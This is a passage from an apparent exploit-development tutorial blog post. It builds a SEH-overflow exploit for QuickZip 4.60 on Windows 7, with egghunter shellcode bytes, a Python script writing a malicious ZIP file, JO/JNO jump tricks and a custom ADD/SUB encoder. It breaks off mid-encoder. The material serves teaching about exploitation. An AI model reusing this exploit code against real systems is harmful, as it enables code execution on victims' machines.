</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">egghunter</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x59</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x37</span>\<span class="n">x51</span>\<span class="n">x5a</span>\<span class="n">x6a</span>\<span class="n">x41</span>\<span class="n">x58</span>\<span class="n">x50</span>\<span class="n">x30</span>\<span class="n">x41</span>\<span class="n">x30</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x6b</span>\<span class="n">x41</span>\<span class="n">x41</span>\<span class="n">x51</span>\<span class="n">x32</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x32</span>\<span class="n">x42</span>\<span class="n">x42</span>\<span class="n">x30</span>\<span class="n">x42</span>\<span class="n">x42</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x58</span>\<span class="n">x50</span>\<span class="n">x38</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x75</span>\<span class="n">x4a</span>\<span class="n">x49</span>\<span class="n">x66</span>\<span class="n">x51</span>\<span class="n">x49</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x52</span>\<span class="n">x73</span>\<span class="n">x53</span>\<span class="n">x63</span>\<span class="n">x62</span>\<span class="n">x73</span>\<span class="n">x36</span>\<span class="n">x33</span>\<span class="n">x4e</span>\<span class="n">x53</span>\<span class="n">x6f</span>\<span class="n">x30</span>\<span class="n">x75</span>\<span class="n">x36</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6d</span>\<span class="n">x51</span>\<span class="n">x59</span>\<span class="n">x5a</span>\<span class="n">x49</span>\<span class="n">x6f</span>\<span class="n">x36</span>\<span class="n">x6f</span>\<span class="n">x72</span>\<span class="n">x62</span>\<span class="n">x71</span>\<span class="n">x42</span>\<span class="n">x42</span>\<span class="n">x4a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x66</span>\<span class="n">x46</span>\<span class="n">x56</span>\<span class="n">x38</span>\<span class="n">x74</span>\<span class="n">x73</span>\<span class="n">x78</span>\<span class="n">x49</span>\<span class="n">x4c</span>\<span class="n">x4b</span>\<span class="n">x4b</span>\<span class="n">x64</span>\<span class="n">x61</span>\<span class="n">x74</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x6f</span>\<span class="n">x47</span>\<span class="n">x63</span>\<span class="n">x31</span>\<span class="n">x4e</span>\<span class="n">x50</span>\<span class="n">x5a</span>\<span class="n">x77</span>\<span class="n">x4c</span>\<span class="n">x77</span>\<span class="n">x75</span>\<span class="n">x53</span>\<span class="n">x44</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x79</span>\<span class="n">x38</span>\<span class="n">x38</span>\<span class="n">x52</span>\<span class="n">x57</span>\<span class="n">x36</span>\<span class="n">x50</span>\<span class="n">x50</span>\<span class="n">x30</span>\<span class="n">x33</span>\<span class="n">x44</span>\<span class="n">x6c</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x59</span>\<span class="n">x6a</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x32</span>\<span class="n">x55</span>\<span class="n">x38</span>\<span class="n">x64</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x70</span>\<span class="n">x75</span>\<span class="n">x6b</span>\<span class="n">x51</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6b</span>\<span class="n">x4f</span>\<span class="n">x79</span>\<span class="n">x77</span>\<span class="n">x41</span>\<span class="n">x41</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="n">egghunter</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>   <span class="c"># padding for nSEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">BBBB</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                               <span class="c"># nSEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x33</span>\<span class="n">x28</span>\<span class="n">x42</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># SEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Length</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">mefile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cst</span><span class="o">.</span><span class="n">zip</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">w</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">complete</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s trigger the crash, pass execution to the program and execute <em>POP-POP-RET</em> instructions. After this, scroll up in the CPU window and try to find end of egghunter payload and long set of <code>INC ECX</code> instructions (representing A characters).</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/16%20found%20egghunter.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/16%20found%20egghunter.png" alt="image" /></a></p>

<p>Great, looks like it&rsquo;s there and it appears to be correct as well - no bad characters were used!</p>

<h2>Jumping back</h2>

<p>Now, we have few more things to look after - the most important thing to remember here is that we need to put address of where the egghunter begins into the EAX and jump to it.</p>

<p>How can we do it having a limited space? Well, first of all - how much space do we have? Quick maths tells us that it&rsquo;s <strong>146</strong> bytes (nseh offset minus the size of egghunter).</p>

<p>What can we do with 146 bytes? We only need to write few instructions, but they need to adhere to the limited character set we&rsquo;re allowed to use. In this case, we cannot use a generic encoder that we already used for egghunter as we simply don&rsquo;t have enough space to fit it in.</p>

<p>This leaves us with one option - we&rsquo;ll need to create our own encoder! It sounds scary and complicated, but it&rsquo;s actually a lot simpler than it seems.</p>

<p>But first, let&rsquo;s see where we are in the program currently.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/12.after%20pop%20pop%20ret.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/12.after%20pop%20pop%20ret.png" alt="image" /></a></p>

<p>So we only have <strong>4</strong> bytes at our disposal to jump back to the payload and start writing our custom encoder. Also, those 4 bytes would need to be, preferably, alphanumeric. Thankfully, there are few instructions we can use, specifically in situations like those!</p>

<p>Credit given where credit&rsquo;s due - thanks to <a href="https://twitter.com/TheColonial">TheColonial</a> for sharing this very useful trick: <a href="http://buffered.io/posts/jumping-with-bad-chars/">http://buffered.io/posts/jumping-with-bad-chars/</a>.</p>

<p>In short, we can simply use <code>JO</code> and <code>JNO</code> instructions to invoke short jumps back into our payload. But how far can we jump? After some playing around with allowed characters I found that some of the bad characters are converted to <code>A2</code>, which translates to 92 in decimal&hellip; which should give us just enough space to allow us to create our custom encoder.</p>

<p>Let&rsquo;s generate the required OPCODES with <code>metasm</code> and add them in our payload in place of nSEH.</p>

<pre><code>metasm &gt; jno $-99
"\x71\x9b"
metasm &gt; jo $-99
"\x70\x9b"
</code></pre>

<p><em>Note:</em> <code>\x9b</code> (-99), since it&rsquo;s a bad character, will actually be converted into <code>\xa2</code> (-92).</p>

<p>The portion of our PoC should now look like this:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="n">egghunter</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>   <span class="c"># padding for nSEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x71</span>\<span class="n">x9b</span>\<span class="n">x70</span>\<span class="n">x9b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># nSEH: jno $-99; jo $-99 ==&gt; 9b will actually be converted to A2, which is $-92</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x33</span>\<span class="n">x28</span>\<span class="n">x42</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># SEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">pattern</span>                              <span class="c"># pattern to look for in memory</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s trigger the crash, pass execution to the program, step through the <em>POP-POP-RET</em> instructions and observe what happens when we step through the <code>JNO</code>/<code>JO</code> instructions.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/17.jno%20jump%20taken.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/17.jno%20jump%20taken.png" alt="image" /></a></p>

<p>Awesome, the jump is taken and we land in our payload! Let&rsquo;s now create our custom encoder to write instructions to jump to the egg hunting routine.</p>

<h2>Custom encoder</h2>

<p>We need to write several instructions to be able to jump to our egghunter, however, there is no way to write them directly without using bad characters.</p>

<p>To get around it we&rsquo;ll need to do the following:</p>

<ol>
<li>Find out what are the opcodes of instructions we want to write</li>
<li>Using simple, mathematical instructions (namely <code>ADD</code> and <code>SUB</code>) we&rsquo;ll place values of the opcodes from step above into a register of our choice (e.g. <code>EAX</code>) using only allowed characters</li>
<li>We&rsquo;ll write value of this register onto the stack, effectively writing the instructions we want to the area pointed to by <code>ESP</code></li>
</ol>


<p>Sounds complicated? It&rsquo;s actually not that bad and it makes a lot more sense once you start playing with it.</p>

<p>First of all, we need to adjust the stack to be able to write to the area of memory we control. Looking at the values of <code>ESP</code> and where we currently are (screenshot above), we need to offset the <code>ESP</code> by <code>0x62C</code> (<code>0x0018FB58</code> (value of <code>EIP</code>) minus <code>0x0018F528</code> (value of <code>ESP</code>) minus <code>0x4</code> (empty bytes for padding)).</p>

<p>This can be achieved using the following instructions:</p>

<pre><code>push esp;
pop eax;
add eax, 0x62C;
push eax;
pop esp;
</code></pre>

<p>Corresponding OPCODES of above instructions are as follows:</p>

<pre><code>"\x54"                  # push esp;
"\x58"                  # pop eax;
"\x05\x2c\x06\x00\x00"  # add eax, 0x62C
"\x50"                  # push eax;
"\x5c"                  # pop esp;
</code></pre>

<p>However, we have a problem - &ldquo;\x05\x2c\x06\x00\x00&rdquo; has two <code>NULL</code> bytes, which would break our exploit.</p>

<p>However, we can easily fix it up by performing number of <code>ADD</code> and <code>SUB</code> instructions using valid characters to set the value we want, e.g.</p>

<pre><code>\x05\x2d\x07\x01\x01    # add eax, 0x0101072D
\x2d\x01\x01\x01\x01    # sub eax, 0x01010101
                        # total:   0x00000630
</code></pre>

<p>Voilà! We were able to achieve the same thing using valid characters. Let&rsquo;s update the exploit and see what happens.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/18.stack%20adjusted.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/18.stack%20adjusted.png" alt="image" /></a></p>

<p>Great, our payload does exactly what we need leaving us with adjusted stack, ready to start writing our encoder.</p>

<p><em>Note:</em> because of the <code>pop esp</code> instruction (<code>\x5c</code>), contents of our ZIP file look a little bit different. The <code>\x5c</code> represents a backslash, which is interpreted by QuickZip as a folder&hellip; this may have some implications later, but that&rsquo;s OK for now.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/19.quickzip%20folder.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/19.quickzip%20folder.png" alt="image" /></a></p>

<p>Now, the last thing we need to do is to write a set of instructions that put a start address of the egghunter into EAX and jump to it.</p>

<p>In order to avoid bad characters, we&rsquo;ll set the values of opcodes we need in the <code>EAX</code> register and push it on the stack that we have adjusted. This way, the instructions we need will be written in the area we control.</p>

<p>It&rsquo;s probably best explained using an example.</p>

<p>Let&rsquo;s start off with what instructions do we actually want to write? The following will do exactly what we need:
<code>
push esp;
pop eax;
sub eax, 0xDEADBEEF
jmp eax;
</code></p>

<p>Pretty simple - push <code>ESP</code> on the stack, pop it into EAX, adjust it by a certain value to land in the egghunter (we don&rsquo;t know the exact value, hence the placeholder <code>0xDEADBEEF</code> for now) and jump to the adjusted address from <code>EAX</code>.</p>

<p>Let&rsquo;s generate the bytes we need:</p>

<pre><code>metasm &gt; push esp
"\x54"
metasm &gt; pop eax
"\x58"
metasm &gt; sub eax, 0xDEADBEEF
"\x2d\xef\xbe\xad\xde"
metasm &gt; jmp eax
"\xff\xe0"
</code></pre>

<p>And write them in groups of 4:</p>

<pre><code>\x54\x58\x2d\xef
\xbe\xad\xde\xff
\xe0\x90\x90\x90
</code></pre>

<p>Since we&rsquo;ll be writing 4 bytes at a time, we needed to pad it out with 3 nops (<code>\x90</code>) at the end (to put the total length of bytes to write to 12).</p>

<p>Now, let&rsquo;s write the bytes starting from bottom-right (because <a href="https://en.wikipedia.org/wiki/Endianness">endianness</a>) - this will indicate the values that we actually need to push onto the stack.</p>

<pre><code>\x90\x90\x90\xe0
\xff\xde\xad\xbe
\xef\x2d\x58\x54
</code></pre>

<p>Remembering that we can only use ASCII values, that means that we should be able to use pretty much any combination of bytes from <code>01</code> to <code>7f</code> for our calculations.</p>

<p>Let&rsquo;s come up with an exploit friendly instructions to write first set of bytes into eax:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>                        <span class="c"># zero out EAX</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>  <span class="c"># and eax,0x10101010</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>  <span class="c"># and eax,0x01010101</span>
</span><span class='line'>                           <span class="c"># write 0x909090e0 into EAX</span>
